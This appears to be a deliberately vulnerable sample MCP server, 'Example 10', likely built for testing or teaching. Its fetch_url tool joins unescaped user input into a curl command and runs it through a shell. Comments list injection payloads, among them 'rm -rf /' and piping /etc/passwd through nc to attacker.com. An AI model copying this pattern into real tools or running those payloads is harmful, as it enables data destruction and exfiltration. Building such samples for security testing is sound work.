# Copyright 2025 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Example 10: Complex Curl Command Injection with HTTP Operations"""
from mcp import FastMCP
import subprocess
import re

app = FastMCP("injection-attacks-service-10")


class HTTPClient:
    """Handles HTTP requests using curl"""

    @staticmethod
    def validate_url(url: str) -> bool:
        """Weak URL validation"""
        # Only checks for basic URL format
        pattern = r"^https?://"
        return bool(re.match(pattern, url))

    @staticmethod
    def build_curl_command(
        url: str,
        method: str = "GET",
        headers: dict = None,
        data: str = None,
        output_file: str = None,
        follow_redirects: bool = True,
        custom_options: str = "",
    ) -> str:
        """Build curl command with options"""
        cmd_parts = ["curl"]

        # Add method
        if method != "GET":
            cmd_parts.append(f"-X {method}")

        # Add headers
        if headers:
            for key, value in headers.items():
                # VULNERABLE: No escaping of header values
                cmd_parts.append(f"-H '{key}: {value}'")

        # Add data for POST/PUT
        if data:
            # VULNERABLE: Data parameter injection
            cmd_parts.append(f"-d '{data}'")

        # Add output file
        if output_file:
            # VULNERABLE: Output file injection
            cmd_parts.append(f"-o {output_file}")

        # Follow redirects
        if follow_redirects:
            cmd_parts.append("-L")

        # Add custom options
        if custom_options:
            # VULNERABLE: Custom options injection
            cmd_parts.append(custom_options)

        # Add URL (main injection point)
        cmd_parts.append(url)

        return " ".join(cmd_parts)

    @staticmethod
    def execute_curl(command: str, timeout: int = 30) -> dict:
        """Execute curl command"""
        # VULNERABLE: Shell execution with user-controlled command
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=timeout
        )

        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
        }


@app.tool()
def fetch_url(
    url: str,
    method: str = "GET",
    headers: str = "",
    post_data: str = "",
    output_file: str = "",
    custom_options: str = "",
    follow_redirects: bool = True,
) -> str:
    """
    Fetch content from URL using curl with flexible HTTP options.
    """
    client = HTTPClient()

    # Weak validation
    if not client.validate_url(url):
        return "Invalid URL format"

    # Parse headers
    header_dict = {}
    if headers:
        for header in headers.split(";"):
            if ":" in header:
                key, value = header.split(":", 1)
                header_dict[key.strip()] = value.strip()

    # VULNERABLE: Command injection through multiple parameters
    # User can inject in url: "http://example.com; rm -rf / #"
    # Or: "http://example.com`malicious_command`"
    # Or in custom_options: "--config /dev/null; malicious_command"
    # Or in output_file: "/tmp/file; cat /etc/passwd | nc attacker.com 4444"

    command = client.build_curl_command(
        url,
        method,
        header_dict,
        post_data,
        output_file,
        follow_redirects,
        custom_options,
    )

    # Execute curl
    result = client.execute_curl(command)

    if result["returncode"] == 0:
        if output_file:
            return f"Content saved to: {output_file}"
        else:
            return f"Content fetched: {len(result['stdout'])} bytes"
    else:
        return f"Request failed: {result['stderr'][:200]}"
